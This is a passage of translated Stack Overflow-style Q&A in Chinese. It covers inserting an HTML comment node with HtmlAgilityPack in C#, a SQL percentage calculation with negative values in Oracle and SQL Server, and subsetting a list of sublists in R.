node2.InnerHtml = node2.InnerHtml.Replace(
    node1.InnerHtml, 
    node1.InnerHtml + "<!--more-->"
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T22:01:46.127

不知道为什么替换不起作用，但是您可以使用 InsertAfter 方法。

```
const string html = @"<p>some text</p>
<p>some more text</p>
<div><p>lots of more paragraphs here</p></div>";
var doc = new HtmlDocument();
doc.LoadHtml(html);
var secondParagraph = doc.DocumentNode.SelectSingleNode("//p[2]");
// var secondParagraph = doc.DocumentNode.Descendants("p").Skip(1).First(); //or Linq
var moreNode= HtmlNode.CreateNode("<!--more-->");
doc.DocumentNode.InsertAfter(moreNode,secondParagraph ); 
```

# sql - SQL将列中的两个负值相除

> ID：12078997
> 
> 赞同：1
> 
> 时间：2012-08-22T18:12:42.190
> 
> 标签：sql, oracle

当我尝试通过 sql 获取百分比计算时，我得到了不同的结果。

```
 ROUND( 100 * (  Col2   /  ( Col1 +   Col2))) 
```

输出

```
col1     col2      colR
-----    -----     ------
150       51       34
-400.11  -160.04   40 
```

当它将两个负值相除时，它给出 40 而不是 29。为了交叉检查，我写了这个查询

```
 select round( 100* ( -160.04/-560.15 ) ) from dual; 
```

它工作得很好，我得到 29。

我的问题是：

1.  我应该如何修改我的查询以伴随负值。
2.  这个查询出了什么问题，为什么 oracle 不能正确查询。

编辑：

我的错，我犯了一个拼写错误并得出了这个结论。我该如何结束这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T19:30:22.263

也许你期望得到这样的结果：

```
 ROUND( 100 * (  Col2   /  ( ABS(Col1) +   ABS(Col2)))) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T19:45:47.823

根据@HLGEM 上面的评论...

在 SQL Server 中，给定以下内容：

```
create table #foo
(
  c1      float not null ,
  c2      float not null ,
  c1c2sum as c1 + c2     ,
  cR      as round( 100.0 * c2 / (c1+c2) , 0 ) ,
  cX      as round( 100.0 * c2 /  c1     , 0 ) ,
)

insert #foo (c1,c2) values( 150     , 51      )
insert #foo (c1,c2) values( -400.11 , -160.04 ) 
```

执行：

```
select * from #foo 
```

产生以下结果集：

```
c1      c2      c1c2sum cR cX
------- ------  ------- -- --
150     51      201     25 34
-400.11 -160.04 -560.15 29 40 
```

我怀疑你有一个括号问题，可以这么说。

# r - 列表子集的模拟

> ID：12078998
> 
> 赞同：2
> 
> 时间：2012-08-22T18:12:43.973
> 
> 标签：r

我想根据子列表元素之一的内容对子列表列表进行子集化，其方式类似于`subset`处理数据帧的方式：

```
sublist1 <- list(data=rnorm(10), name="name1", keepMe=2)
sublist2 <- list(data=rnorm(10), name="name2", keepMe=2)
sublist3 <- list(data=rnorm(10), name="name3", keepMe=3)
myList <- list(s1=sublist1, s2=sublist2, s3=sublist3) 
```

我想做一些类似的事情`keepers <- subset[myList, keepMe==2]`，它会返回一个长度为 2 的列表。

以下*几乎*是我想要的：

```
require(plyr)
selector <- function(x) {
  if (x$keepMe==2) {return(x)} 
  else {return(NULL)}
}
keepers <- llply(myList, selector) 
```

除了在这种情况下不需要的列表元素不会被丢弃，它们只是被替换为`NULL`.

请注意，在所有情况下，子列表都将具有相同的组件，只有组件的值会发生变化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:24:39.747

这将为您提供两个`keepMe`位置为 TRUE 的列表：

```
myList[ unlist( sapply(myList, "[", "keepMe") ) ] 
```

@ttmaccer 解决方案省略`i=`

```
myList[ sapply(myList, "[[", "keepMe")  ] 
```

（这会成功，因为`sapply`如果可以的话，它将尝试传递一个向量或矩阵，但是“[”返回一个列表，而“[[”返回一个原子逻辑。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:17:18.120

这*可行*，但我不知道是否有更直接的方法：

```
keepers = myList[-(which(sapply(1:length(myList), 
                                function(x) myList[[x]]$keepMe == FALSE)))] 
```

以下是`str()`结果列表：

```
str(keepers)
# List of 2
# $ s1:List of 3
#  ..$ data  : num [1:10] -0.82 0.487 0.738 0.576 -0.305 ...
#  ..$ name  : chr "name1"
#  ..$ keepMe: logi TRUE
# $ s2:List of 3
#  ..$ data  : num [1:10] -0.0449 -0.0162 0.9438 0.8212 0.5939 ...
#  ..$ name  : chr "name2"
#  ..$ keepMe: logi TRUE 
```